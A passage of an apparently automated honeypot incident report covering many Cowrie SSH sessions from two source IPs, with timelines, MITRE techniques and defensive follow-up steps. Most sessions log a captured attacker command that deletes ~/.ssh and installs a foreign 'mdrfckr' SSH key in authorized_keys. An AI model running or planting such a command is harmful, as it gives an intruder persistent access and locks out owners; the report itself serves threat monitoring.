| `2026-06-02 19:01:28` | `cowrie.command.failed` |
| `2026-06-02 19:01:28` | `cowrie.log.closed` |
| `2026-06-02 19:01:28` | `cowrie.session.params` |
| `2026-06-02 19:01:28` | `cowrie.command.input` |
| `2026-06-02 19:01:28` | `cowrie.session.file_download` |
| `2026-06-02 19:01:28` | `cowrie.log.closed` |
| `2026-06-02 19:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f839a6b1a15e

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:01 |
| **Last Seen** | 2026-06-02 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:01:30` | `cowrie.session.connect` |
| `2026-06-02 19:01:30` | `cowrie.client.version` |
| `2026-06-02 19:01:30` | `cowrie.client.kex` |
| `2026-06-02 19:01:30` | `cowrie.login.success` |
| `2026-06-02 19:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4474aa8f57bb

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:03 |
| **Last Seen** | 2026-06-02 19:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:03:12` | `cowrie.session.connect` |
| `2026-06-02 19:03:12` | `cowrie.client.version` |
| `2026-06-02 19:03:12` | `cowrie.client.kex` |
| `2026-06-02 19:03:12` | `cowrie.login.success` |
| `2026-06-02 19:03:13` | `cowrie.session.params` |
| `2026-06-02 19:03:13` | `cowrie.command.input` |
| `2026-06-02 19:03:13` | `cowrie.command.failed` |
| `2026-06-02 19:03:13` | `cowrie.log.closed` |
| `2026-06-02 19:03:13` | `cowrie.session.params` |
| `2026-06-02 19:03:13` | `cowrie.command.input` |
| `2026-06-02 19:03:13` | `cowrie.session.file_download` |
| `2026-06-02 19:03:13` | `cowrie.log.closed` |
| `2026-06-02 19:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063dd31645a5

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:03 |
| **Last Seen** | 2026-06-02 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:03:15` | `cowrie.session.connect` |
| `2026-06-02 19:03:15` | `cowrie.client.version` |
| `2026-06-02 19:03:15` | `cowrie.client.kex` |
| `2026-06-02 19:03:15` | `cowrie.login.success` |
| `2026-06-02 19:03:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ad9c5797077

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:05 |
| **Last Seen** | 2026-06-02 19:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:05:01` | `cowrie.session.connect` |
| `2026-06-02 19:05:01` | `cowrie.client.version` |
| `2026-06-02 19:05:01` | `cowrie.client.kex` |
| `2026-06-02 19:05:02` | `cowrie.login.success` |
| `2026-06-02 19:05:02` | `cowrie.session.params` |
| `2026-06-02 19:05:02` | `cowrie.command.input` |
| `2026-06-02 19:05:02` | `cowrie.command.failed` |
| `2026-06-02 19:05:02` | `cowrie.log.closed` |
| `2026-06-02 19:05:02` | `cowrie.session.params` |
| `2026-06-02 19:05:02` | `cowrie.command.input` |
| `2026-06-02 19:05:02` | `cowrie.session.file_download` |
| `2026-06-02 19:05:02` | `cowrie.log.closed` |
| `2026-06-02 19:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62791e03d56e

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:05 |
| **Last Seen** | 2026-06-02 19:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:05:04` | `cowrie.session.connect` |
| `2026-06-02 19:05:04` | `cowrie.client.version` |
| `2026-06-02 19:05:04` | `cowrie.client.kex` |
| `2026-06-02 19:05:04` | `cowrie.login.success` |
| `2026-06-02 19:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a174d89aee6d

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:06 |
| **Last Seen** | 2026-06-02 19:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:06:50` | `cowrie.session.connect` |
| `2026-06-02 19:06:50` | `cowrie.client.version` |
| `2026-06-02 19:06:50` | `cowrie.client.kex` |
| `2026-06-02 19:06:51` | `cowrie.login.success` |
| `2026-06-02 19:06:51` | `cowrie.session.params` |
| `2026-06-02 19:06:51` | `cowrie.command.input` |
| `2026-06-02 19:06:51` | `cowrie.command.failed` |
| `2026-06-02 19:06:51` | `cowrie.log.closed` |
| `2026-06-02 19:06:51` | `cowrie.session.params` |
| `2026-06-02 19:06:51` | `cowrie.command.input` |
| `2026-06-02 19:06:52` | `cowrie.session.file_download` |
| `2026-06-02 19:06:52` | `cowrie.log.closed` |
| `2026-06-02 19:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b13275b229d

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:06 |
| **Last Seen** | 2026-06-02 19:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:06:53` | `cowrie.session.connect` |
| `2026-06-02 19:06:53` | `cowrie.client.version` |
| `2026-06-02 19:06:53` | `cowrie.client.kex` |
| `2026-06-02 19:06:54` | `cowrie.login.success` |
| `2026-06-02 19:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69faa91b0831

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:08 |
| **Last Seen** | 2026-06-02 19:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:08:41` | `cowrie.session.connect` |
| `2026-06-02 19:08:41` | `cowrie.client.version` |
| `2026-06-02 19:08:41` | `cowrie.client.kex` |
| `2026-06-02 19:08:42` | `cowrie.login.success` |
| `2026-06-02 19:08:42` | `cowrie.session.params` |
| `2026-06-02 19:08:42` | `cowrie.command.input` |
| `2026-06-02 19:08:42` | `cowrie.command.failed` |
| `2026-06-02 19:08:42` | `cowrie.log.closed` |
| `2026-06-02 19:08:42` | `cowrie.session.params` |
| `2026-06-02 19:08:42` | `cowrie.command.input` |
| `2026-06-02 19:08:42` | `cowrie.session.file_download` |
| `2026-06-02 19:08:42` | `cowrie.log.closed` |
| `2026-06-02 19:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1a0d11182d0

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:08 |
| **Last Seen** | 2026-06-02 19:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:08:44` | `cowrie.session.connect` |
| `2026-06-02 19:08:44` | `cowrie.client.version` |
| `2026-06-02 19:08:44` | `cowrie.client.kex` |
| `2026-06-02 19:08:45` | `cowrie.login.success` |
| `2026-06-02 19:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1969754fc81

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:12 |
| **Last Seen** | 2026-06-02 19:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:12:24` | `cowrie.session.connect` |
| `2026-06-02 19:12:24` | `cowrie.client.version` |
| `2026-06-02 19:12:24` | `cowrie.client.kex` |
| `2026-06-02 19:12:25` | `cowrie.login.success` |
| `2026-06-02 19:12:25` | `cowrie.session.params` |
| `2026-06-02 19:12:25` | `cowrie.command.input` |
| `2026-06-02 19:12:25` | `cowrie.command.failed` |
| `2026-06-02 19:12:25` | `cowrie.log.closed` |
| `2026-06-02 19:12:25` | `cowrie.session.params` |
| `2026-06-02 19:12:25` | `cowrie.command.input` |
| `2026-06-02 19:12:25` | `cowrie.session.file_download` |
| `2026-06-02 19:12:25` | `cowrie.log.closed` |
| `2026-06-02 19:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bff85ad33af

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:12 |
| **Last Seen** | 2026-06-02 19:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:12:27` | `cowrie.session.connect` |
| `2026-06-02 19:12:27` | `cowrie.client.version` |
| `2026-06-02 19:12:27` | `cowrie.client.kex` |
| `2026-06-02 19:12:28` | `cowrie.login.success` |
| `2026-06-02 19:12:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f1b61644256

| Field | Detail |
|---|---|
| **Source IP** | `92.112.126[.]183` |
| **First Seen** | 2026-06-02 19:14 |
| **Last Seen** | 2026-06-02 19:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:14:41` | `cowrie.session.connect` |
| `2026-06-02 19:14:41` | `cowrie.client.version` |
| `2026-06-02 19:14:41` | `cowrie.client.kex` |
| `2026-06-02 19:14:41` | `cowrie.login.success` |
| `2026-06-02 19:14:42` | `cowrie.session.params` |
| `2026-06-02 19:14:42` | `cowrie.command.input` |
| `2026-06-02 19:14:42` | `cowrie.command.failed` |
| `2026-06-02 19:14:42` | `cowrie.log.closed` |
| `2026-06-02 19:14:42` | `cowrie.session.params` |
| `2026-06-02 19:14:42` | `cowrie.command.input` |
| `2026-06-02 19:14:42` | `cowrie.session.file_download` |
| `2026-06-02 19:14:42` | `cowrie.log.closed` |
| `2026-06-02 19:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.112.126[.]183` to AbuseIPDB if not already reported
- [ ] Block `92.112.126[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c2c6861ebfc

| Field | Detail |
|---|---|
| **Source IP** | `92.112.126[.]183` |
| **First Seen** | 2026-06-02 19:14 |
| **Last Seen** | 2026-06-02 19:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:14:44` | `cowrie.session.connect` |
| `2026-06-02 19:14:44` | `cowrie.client.version` |
| `2026-06-02 19:14:44` | `cowrie.client.kex` |
| `2026-06-02 19:14:45` | `cowrie.login.success` |
| `2026-06-02 19:14:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.112.126[.]183` to AbuseIPDB if not already reported
- [ ] Block `92.112.126[.]183` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-926057e6be81

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:21 |
| **Last Seen** | 2026-06-02 19:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:21:07` | `cowrie.session.connect` |
| `2026-06-02 19:21:07` | `cowrie.client.version` |
| `2026-06-02 19:21:07` | `cowrie.client.kex` |
| `2026-06-02 19:21:08` | `cowrie.login.success` |
| `2026-06-02 19:21:08` | `cowrie.session.params` |
| `2026-06-02 19:21:08` | `cowrie.command.input` |
| `2026-06-02 19:21:08` | `cowrie.command.failed` |
| `2026-06-02 19:21:08` | `cowrie.log.closed` |
| `2026-06-02 19:21:08` | `cowrie.session.params` |
| `2026-06-02 19:21:08` | `cowrie.command.input` |
| `2026-06-02 19:21:08` | `cowrie.session.file_download` |
| `2026-06-02 19:21:08` | `cowrie.log.closed` |
| `2026-06-02 19:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96da34b60c06

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:21 |
| **Last Seen** | 2026-06-02 19:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:21:10` | `cowrie.session.connect` |
| `2026-06-02 19:21:10` | `cowrie.client.version` |
| `2026-06-02 19:21:10` | `cowrie.client.kex` |
| `2026-06-02 19:21:10` | `cowrie.login.success` |
| `2026-06-02 19:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b636e89f3d8d

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:23 |
| **Last Seen** | 2026-06-02 19:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:23:05` | `cowrie.session.connect` |
| `2026-06-02 19:23:05` | `cowrie.client.version` |
| `2026-06-02 19:23:05` | `cowrie.client.kex` |
| `2026-06-02 19:23:06` | `cowrie.login.success` |
| `2026-06-02 19:23:06` | `cowrie.session.params` |
| `2026-06-02 19:23:06` | `cowrie.command.input` |
| `2026-06-02 19:23:06` | `cowrie.command.failed` |
| `2026-06-02 19:23:06` | `cowrie.log.closed` |
| `2026-06-02 19:23:06` | `cowrie.session.params` |
| `2026-06-02 19:23:06` | `cowrie.command.input` |
| `2026-06-02 19:23:06` | `cowrie.session.file_download` |
| `2026-06-02 19:23:06` | `cowrie.log.closed` |
| `2026-06-02 19:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd783e875b1e

| Field | Detail |
|---|---|
| **Source IP** | `45.64.74[.]51` |
| **First Seen** | 2026-06-02 19:23 |
| **Last Seen** | 2026-06-02 19:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 19:23:08` | `cowrie.session.connect` |
| `2026-06-02 19:23:08` | `cowrie.client.version` |
| `2026-06-02 19:23:08` | `cowrie.client.kex` |
| `2026-06-02 19:23:08` | `cowrie.login.success` |
| `2026-06-02 19:23:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.64.74[.]51` to AbuseIPDB if not already reported
- [ ] Block `45.64.74[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-179b2f8bfd04

| Field | Detail |
